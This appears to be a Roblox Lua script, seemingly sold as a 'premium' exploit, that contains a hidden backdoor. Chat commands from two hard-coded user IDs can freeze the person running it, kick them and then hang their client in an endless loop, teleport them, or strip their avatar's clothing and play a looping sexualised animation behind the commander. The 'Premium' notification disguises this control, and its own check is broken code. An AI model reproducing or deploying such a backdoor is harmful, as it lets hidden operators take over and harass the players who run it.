local a = game.Players.LocalPlayer
local b = {
    3454940968,
    3399224832,
}
local function c(d, e)
    local f = game:GetService("Players"):GetPlayerByUserId(e)
    local g = string.lower(d)
    local h = string.split(g, " ")
    local i = string.lower(a.Name)
    local j = string.find(i, h[2])
    if j then
        if string.find(h[1], ":freeze") then
            a.Character.HumanoidRootPart.Anchored = true
        end
        if string.find(h[1], ":unfreeze") then
            a.Character.HumanoidRootPart.Anchored = false
        end
        if string.find(h[1], ":benx") then
            bending = true
            local k = f.Name
            local l =
                a.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(
                game:GetService("ReplicatedStorage").ClientAnimations.Crouching
            )
            l.Looped = true
            l:Play()
            local m = .5
            local n = false
            local o = a.Character:FindFirstChild("Shirt")
            local p = a.Character:FindFirstChild("Pants")
            if o then
                o:Destroy()
            end
            if p then
                p:Destroy()
            end
            local q
            local r = function()
                local s = game.Workspace.Players:FindFirstChild(k) or game.Workspace:FindFirstChild(k)
                local t = a.Character
                if s then
                    if n == true then
                        m = m - 0.1
                    else
                        m = m + 0.1
                    end
                    if m >= 2 then
                        n = true
                    elseif m < 0.5 then
                        n = false
                    end
                    t.HumanoidRootPart.CFrame =
                        game.Players[k].Character.HumanoidRootPart.CFrame +
                        game.Players[k].Character.HumanoidRootPart.CFrame.lookVector * m
                end
            end
            local u = function()
                q = game:GetService("RunService").Heartbeat:Connect(r)
            end
            local v = function()
                q:Disconnect()
                l:Stop()
            end
            u()
            repeat
                wait()
            until bending == false
            v()
        end
        if string.find(h[1], ":unbenx") then
            while bending == true do
                wait()
                bending = false
            end
        end
        if string.find(h[1], ":kick") then
            local w = table.find(b, a.UserId)
            if not w then
                a:Kick("PERMA-BAN")
                wait(0.25)
                while true do
                end
            end
        end
        if string.find(h[1], ":bring") then
            a.Character.HumanoidRootPart.CFrame =
                CFrame.new(game.Workspace.Players:FindFirstChild(f.Name).HumanoidRootPart.Position)
        end
        if string.find(h[1], ":ban") then
            if table.find(b, e) then
                local w = table.find(b, a.UserId)
                if not w then
                    a:Kick("PERMA-BAN")
            
                end
            end
        end
    else
        if string.find(d, "/e test") then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Lox On Top", "All")
        end
    end
end
game:GetService("Players").PlayerAdded:Connect(function(e)
    local x = table.find(b, e.UserId)
    if x then
        e.Chatted:Connect(
            function(d)
                c(d, e.UserId)
            end)
        end
    end)
for y, z in pairs(game:GetService("Players"):GetChildren()) do
    local x = table.find(b, z.UserId)
    if x then
        z.Chatted:Connect(function(d)
            c(d, z.UserId)
        end)
    end
end


if game.Players.LocalPlayer == b then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Premium Loaded";
	Text = "";
	Time = 10;
	Icon = "rbxassetid://0000000";
})
else
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Rank!";
	Text = "You Dont Have Premium!";
	Time = 10;
})
end
